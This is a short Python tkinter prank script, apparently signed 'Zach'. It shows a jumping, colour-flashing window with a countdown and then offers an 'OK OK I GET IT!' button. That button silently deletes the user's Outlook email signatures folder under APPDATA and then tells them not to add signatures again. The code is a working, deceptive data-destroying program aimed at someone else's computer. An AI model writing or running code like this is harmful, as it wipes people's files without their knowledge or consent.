
import os
import shutil
import tkinter as tk
from tkinter import messagebox
import random

jumping = True
countdown = 5
flash_colors = ["red", "yellow", "green", "blue", "purple", "orange", "pink", "cyan"]

def remove_signatures_and_exit():
    sig_path = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Signatures')
    try:
        if os.path.exists(sig_path):
            shutil.rmtree(sig_path)
        os.makedirs(sig_path)
    except Exception as e:
        messagebox.showerror("Error", f"Could not remove signatures:\n{e}")
        root.destroy()
        return

    messagebox.showinfo("DONE", "NOW DON'T ADD SIGNATURES ANYMORE. THANKS – Zach")
    root.destroy()

def move_window():
    if not jumping:
        return
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    x = random.randint(0, screen_width - 300)
    y = random.randint(0, screen_height - 150)
    root.geometry(f"300x150+{x}+{y}")
    root.after(400, move_window)

def flash_colors_func():
    if not jumping:
        return
    color = random.choice(flash_colors)
    root.configure(bg=color)
    btn.configure(bg=color, activebackground=color)
    root.after(200, flash_colors_func)

def update_countdown():
    global countdown, jumping
    if countdown > 0:
        btn.config(text=f"{countdown}...")
        countdown -= 1
        root.after(1000, update_countdown)
    else:
        jumping = False
        root.configure(bg="white")
        btn.configure(bg="white", activebackground="white")
        btn.config(text="OK OK I GET IT!", command=remove_signatures_and_exit)

# GUI setup
root = tk.Tk()
root.title("HEY YOU!")
root.geometry("300x150")
root.resizable(False, False)

btn = tk.Button(root, text="", font=("Segoe UI", 16, "bold"), wraplength=260)
btn.pack(expand=True, fill='both', padx=10, pady=10)

# Start the mayhem
move_window()
flash_colors_func()
update_countdown()

root.mainloop()
